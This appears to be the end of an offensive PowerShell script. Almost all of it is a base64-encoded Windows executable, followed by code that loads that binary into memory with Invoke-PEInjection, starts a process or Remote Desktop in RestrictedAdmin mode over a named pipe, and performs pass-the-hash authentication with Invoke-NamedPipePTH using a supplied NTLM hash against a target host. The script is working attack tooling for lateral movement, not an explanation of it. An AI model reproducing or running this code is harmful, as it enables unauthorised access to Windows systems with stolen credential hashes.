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X4Nfw1ADYENgg2DDYQNhQ2GDYcNiA2JDYoNiw2MDY0Njg2PDZANkQ2SDZMNlA2VDZYNlw2YDZkNmg2bDZwNnQ2eDZ8NoA2hDaINow2kDacNqA2pDaoNqw2sDa0Nrg2vDbANsQ2yDbMNtA21DbYNtw24DbkNug27DbwNvQ2+Db8NgA3BDcINww3EDcUNxg3HDcgNyQ3KDcsNzA3NDc4Nzw3QDdEN0g3qDqsOrA6tDoAAACAAQDQAQAA/DIEMwwzFDMcMyQzLDM0MzwzRDNMM1QzXDNkM2wzdDN8M4QzjDOUM5wzpDOsM7QzvDPEM8wz1DPcM+Qz7DP0M/wzBDQMNBQ0HDQkNCw0NDQ8NEQ0TDRUNFw0ZDRsNHQ0fDSENIw0lDScNKQ0rDS0NLw0xDTMNNQ03DTkNOw09DT8NAQ1DDUUNRw1JDUsNTQ1PDVENUw1VDVcNWQ1bDV0NXw1hDWMNZQ1nDWkNaw1tDW8NcQ1zDXUNdw15DXsNfQ1/DUENgw2FDYcNiQ2LDY0Njw2RDZMNlQ2XDZkNmw2dDZ8NoQ2jDaUNpw2pDasNrQ2vDbENsw21DbcNuQ27Db0Nvw2BDcMNxQ3HDckNyw3NDc8N0Q3TDdUN1w3ZDdsN3Q3fDeEN4w3lDecN6Q3rDe0N7w3xDfMN9Q33DfkN+w39Df8NwQ4DDgUOBw4JDgsODQ4PDhEOEw4VDhcOGQ4bDh0OHw4hDiMOJQ4nDikOKw4tDi8OMQ4zDjUONw45DjsOPQ4/DgEOQw5FDkcOSQ5LDk0OTw5RDlMOVQ5XDlkOWw5dDl8OYQ5jDmUOZw5pDmsObQ5vDnEOcw51DncOeQ57Dn0Ofw5BDoMOhQ6AJABANABAAAYNCA0KDQwNDg0QDRINFA0WDRgNGg0cDR4NIA0iDSQNJg0oDSoNLA0uDTANMg00DTYNOA06DTwNPg0ADUINRA1GDUgNSg1MDU4NUA1SDVQNVg1YDVoNXA1eDWANYg1kDWYNaA1qDWwNbg1wDXINdA12DXgNeg18DX4NQA2CDYQNhg2IDYoNjA2ODZANkg2UDZYNmA2aDZwNng2gDaINpA2mDagNqg2sDa4NsA2yDbQNtg24DboNvA2+DYANwg3EDcYNyA3KDcwNzg3QDdIN1A3WDdgN2g3cDd4N4A3iDeQN5g3oDeoN7A3uDfAN8g30DfYN+A36DfwN/g3ADgIOBA4GDggOCg4MDg4OEA4SDhQOFg4YDhoOHA4eDiAOIg4kDiYOKA4qDiwOLg4wDjIONA42DjgOOg48Dj4OAA5CDkQORg5IDkoOTA5ODlAOUg5UDlYOWA5aDlwOXg5gDmIOZA5mDmgOag5sDm4OcA5yDnQOdg54DnoOfA5+DkAOgg6EDoYOiA6KDowOjg6QDpIOlA6WDpgOmg6cDp4OoA6iDqQOpg6oDqoOrA6uDrAOsg60DrYOuA66DrwOvg6ADsIOxA7GDsgOyg7MDsAoAEAEAAAACo/Lj8yPzY/ALABAEgAAAAsODQ4PDhEOEw4VDhcOGQ4bDh0OHw4hDiMOJQ4nDikOKw4tDi8OMQ4zDjUONw45DjsOPQ4/DgEOQw5yDnMOQAAAMABALgAAABsMnAyeDL0MvgyCDMMMxQzLDM8M0AzUDNUM1gzYDN4M4gzjDOcM6AzqDPAM9A28DYMNxA3LDcwN0w3UDdwN3g3fDeYN6A3pDe0N9g35DfsNxQ4GDg0ODg4QDhIOFA4VDhcOHA4eDiMOKQ4qDjIOOg4CDkQORw5UDlwOZA5rDmwOdA58DkQOjA6UDpwOpA6sDrQOvA6EDswO1A7cDuQO7A70DvwOww8EDwwPFA8bDxwPADgAQBMAAAAODFoMXgxiDGYMagxwDHMMdAx1DHwMfQxIDcoNyw3MDc0Nzg3PDdAN0Q3SDdMN1g3XDdgN2Q3aDdsN3A3dDfAOOA4/DgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

 if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
 {
       [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($executable64)
 }
 else
 {
       [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($executable86)
 }
 if ($RDP)
 {
    Invoke-PEInjection -PEBytes $PEBytes -ExeArgs "-e C:\windows\system32\mstsc.exe -a /RestrictedAdmin -p $PipeName"
 }
 else
 {
    Invoke-PEInjection -PEBytes $PEBytes -ExeArgs "-e $binary -p $PipeName"
 }
 }
 onlytogettheoutput -binary $binary -PipeName $PipeName -RDP $RDP

 } -ArgumentList $binary,$RDP,$Pipename
 Sleep 4

 Invoke-NamedPipePTH -Username $Username -Hash $Hash -Target $Target -Domain $domain -PipeName $PipeName
 }